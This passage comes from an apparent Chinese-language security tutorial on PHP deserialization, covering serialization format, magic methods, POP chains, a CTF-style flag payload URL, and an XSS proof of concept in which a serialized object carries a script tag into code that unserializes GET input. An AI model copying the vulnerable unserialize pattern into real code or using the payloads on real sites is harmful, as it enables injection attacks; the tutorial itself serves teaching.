+Boolean <span class="token punctuation">:</span> b<span class="token punctuation">:</span>value<span class="token punctuation">;</span><span class="token punctuation">(</span>保存<span class="token number">1</span>或<span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token keyword">Null</span> <span class="token punctuation">:</span> N<span class="token punctuation">;</span>
+<span class="token keyword">Array</span> <span class="token punctuation">:</span> a<span class="token punctuation">:</span>size<span class="token punctuation">:</span><span class="token punctuation">{</span>key definition<span class="token punctuation">;</span>value definition<span class="token punctuation">;</span><span class="token punctuation">(</span>repeated per element<span class="token punctuation">)</span><span class="token punctuation">}</span>
+Object <span class="token punctuation">:</span> O<span class="token punctuation">:</span><span class="token function">strlen</span><span class="token punctuation">(</span>object name<span class="token punctuation">)</span><span class="token punctuation">:</span>object name<span class="token punctuation">:</span>object size<span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token function">strlen</span><span class="token punctuation">(</span>property name<span class="token punctuation">)</span><span class="token punctuation">:</span>property name<span class="token punctuation">:</span>property definition<span class="token punctuation">;</span><span class="token punctuation">(</span>repeated per property<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>
+</li>
+<li><p>在PHP中对象属性修饰符有<code>public、private、protected</code>三种，其在序列时所生成的字节序列不相同。</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span><span class="token punctuation">(</span>公共的<span class="token punctuation">)</span><span class="token punctuation">:</span>在本类内部、外部类、子类都可以访问
+s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"Alice"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"address"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"四川成都"</span><span class="token punctuation">;</span>
+
+<span class="token function">protect</span><span class="token punctuation">(</span>受保护的<span class="token punctuation">)</span><span class="token punctuation">:</span>只有本类或子类或父类中可以访问
+s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"%00*%00gender"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"女"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">private</span><span class="token punctuation">(</span>私人的<span class="token punctuation">)</span><span class="token punctuation">:</span>只有本类内部可以使用
+s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string">"%00UserInfo%00isGood"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre>
+</li>
+<li><p>在反序列时需要将需要与定义的类结构放在一起，否则反序列化失败不能得到对象的反序列化对象。</p>
+</li>
+</ul>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>魔术方法是语言中保留的方法名，各个方法会在对应操作时自动调用，下面是PHP语言中的魔术方法。</p>
+<ul>
+<li><font color="blue"><code>__construct()</code>: 当创建对象时触发，一般用于初始化对象，对变量赋初值</font></li>
+<li><font color="blue"><code>__destruct()</code>: 当一个对象被销毁时触发</font></li>
+<li><font color="blue"><code>__sleep()</code>: 使用<code>serialize()</code>时自动触发 </font></li>
+<li><font color="blue"><code>__wakeup()</code>: 使用<code>unserialize()</code>时自动触发</font></li>
+<li><font color="blue"><code>__toString()</code>: 当一个类被当成字符串使用时触发</font></li>
+<li><code>__invoke()</code>: 当尝试以调用函数的方式调用一个对象时触发</li>
+<li><code>__call()</code>: 在对象上下文中调用不可访问的方法时触发 </li>
+<li><code>__callStatic()</code>: 在静态上下文中调用不可访问的方法时触发 </li>
+<li><code>__get()</code>: 用于从不可访问的属性读取数据</li>
+<li><code>__set()</code>: 用于将数据写入不可访问的属性</li>
+<li><code>__isset()</code>: 在不可访问的属性上调用<code>isset()</code>或<code>empty()</code>触发</li>
+<li><code>__unset()</code>: 在不可访问的属性上使用unset()时触发</li>
+<li><font color="blue"><code>__serialize()</code>: 与<code>__sleep()</code>魔术方法一样，若同时定义则忽略<code>__sleep()</code>执行该方法（PHP7.4.0开始启用）</font></li>
+<li><font color="blue"><code>__unserialize()</code>: 与<code>__wakeup()</code>魔术方法一样，若同时定义则忽略<code>__wakeup()</code>执行该方法（PHP7.4.0开始启用）</font></li>
+</ul>
+<p>下面的代码示例中展示了重要魔术方法的使用：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 序列化: %00*%00属性名</span>
+    <span class="token keyword">protected</span> <span class="token variable">$gender</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 序列化: %00类名%00属性名</span>
+    <span class="token keyword">private</span> <span class="token variable">$isGood</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// 实例化时被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$gender</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"__construct&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">address</span> <span class="token operator">=</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">gender</span> <span class="token operator">=</span> <span class="token variable">$gender</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 对象销毁时被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"__destruct&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 打印对象时被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'name: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'age: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'address: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">address</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'gender: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">gender</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'isGood: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isGood</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">'__toString&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 对象序列化时先被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"__sleep&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 数组指定可以哪些属性可以被序列化</span>
+        <span class="token comment" spellcheck="true">// 这里可以更好的控制访问权限（不允许私有属性被序列化）</span>
+        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token string">'address'</span><span class="token punctuation">,</span> <span class="token string">'gender'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 对象反序列化时被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"__wakeup&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 当调用不存在的非静态方法时</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'__call&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"调用的$name($arg)方法不存在&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 当调用不存在的静态方法</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'__callStatic&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"调用的$name($arg)静态方法不存在&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'__get&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'__set&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token string">'---------------对象实例化---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">'四川成都'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'---------------调用对象的方法或属性---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">PrintVar</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'---------------打印对象---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'------------对象序列化----------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 序列化</span>
+<span class="token variable">$s_serialize</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"serialize_Str ->&lt;br>"</span> <span class="token punctuation">.</span> <span class="token variable">$s_serialize</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'serialize_str by urlencode ->&lt;br>'</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$s_serialize</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'-----------对象反序列化---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 反序列化</span>
+<span class="token variable">$unseri</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s_serialize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$unseri</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">/////////////////////////////////////////////////////////////</span>
+<span class="token comment" spellcheck="true">// 输出</span>
+<span class="token comment" spellcheck="true">// PHP5.6.9</span>
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>对象实例化<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+__construct
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>调用对象的方法或属性<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+__call
+调用的<span class="token function">PrintVar</span><span class="token punctuation">(</span><span class="token keyword">Array</span><span class="token punctuation">)</span>方法不存在
+__get
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>打印对象<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+__toString
+name<span class="token punctuation">:</span> Alice
+age<span class="token punctuation">:</span> <span class="token number">18</span>
+address<span class="token punctuation">:</span> 四川成都
+gender<span class="token punctuation">:</span> 女
+isGood<span class="token punctuation">:</span> <span class="token number">1</span>
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>对象序列化<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
+__sleep
+serialize_Str <span class="token operator">-</span><span class="token operator">></span>
+O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"UserInfo"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"Alice"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"address"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"四川成都"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"*gender"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"女"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+serialize_str by urlencode <span class="token operator">-</span><span class="token operator">></span>
+O<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22UserInfo<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Alice<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22age<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bi<span class="token operator">%</span><span class="token constant">3A18</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A7</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22address<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A12</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">9B</span><span class="token operator">%</span><span class="token constant">9B</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token constant">9D</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token number">90</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token constant">BD</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A9</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span>00gender<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token constant">B3</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span>
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>对象反序列化<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+__wakeup
+
+<span class="token function">object</span><span class="token punctuation">(</span>UserInfo<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (5) {</span>
+  <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"Alice"</span>
+  <span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>
+  <span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token string">"四川成都"</span>
+  <span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">:</span><span class="token keyword">protected</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"女"</span>
+  <span class="token punctuation">[</span><span class="token string">"isGood"</span><span class="token punctuation">:</span><span class="token string">"UserInfo"</span><span class="token punctuation">:</span><span class="token keyword">private</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+__destruct
+__destruct
+<span class="token comment" spellcheck="true">// 一个创建的对象一个反序列化得到的对象</span>
+<span class="token comment" spellcheck="true">////////////////////////////////////////////////////////////</span></code></pre>
+<h2 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h2><p>如下所示的代码片段需要通过发序列化操作才能得到flag。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>
+<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"flag{xxxxxx}"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+payload<span class="token punctuation">:</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?input=s:4:"flag";</span>
+<span class="token comment" spellcheck="true">// 输出</span>
+flag<span class="token punctuation">{</span>xxxxxx<span class="token punctuation">}</span></code></pre>
+<ul>
+<li>将<code>serialize(flag)</code>序列化后的结果作为参数传递即可得到flag。</li>
+</ul>
+<p>这是一个极其简化代码原型，在真实的环境中通过序列化的是类对象，反序列化的将触发魔术方法进而引起其他危险操作，如代码执行、命令执行等。</p>
+<h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>反序列化漏洞的发现一般需要审计源码，寻找可利用的POP链。</p>
+<p>直接在魔术方法中就有可以利用的漏洞，自动调用魔术方法从而触发漏洞，这种方式是反序列化漏洞利用的简化版，而实际中基本不会有这种这么简单的，更多的则是需要通过<strong>寻找相同的函数名将类的属性和敏感函数的属性联系起来</strong>。</p>
+<p><strong>POP链（Property Oriented Programming Chain）</strong>：通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递、关联等可以调用的其他执行敏感操作的函数，绕过传递参数执行敏感操作，即</p>
+<p><font color="blue"><strong>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</strong></font></p>
+<h1 id="序列化漏洞"><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="当目标被public修饰时反序列化漏洞的利用"><a href="#当目标被public修饰时反序列化漏洞的利用" class="headerlink" title="当目标被public修饰时反序列化漏洞的利用"></a>当目标被public修饰时反序列化漏洞的利用</h3><h4 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h4><ul>
+<li>反序列化对象的公共属性值可控；</li>
+<li>触发魔术方法时将公共属性值直接打印。</li>
+</ul>
+<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"demo"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>先用如下代码输出利用的序列化串</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">'&lt;script>alert(1)&lt;/script>'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// payload</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>执行结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/反序列化导致XSS漏洞.png" alt="反序列化导致XSS漏洞"></center>
+
+<ul>
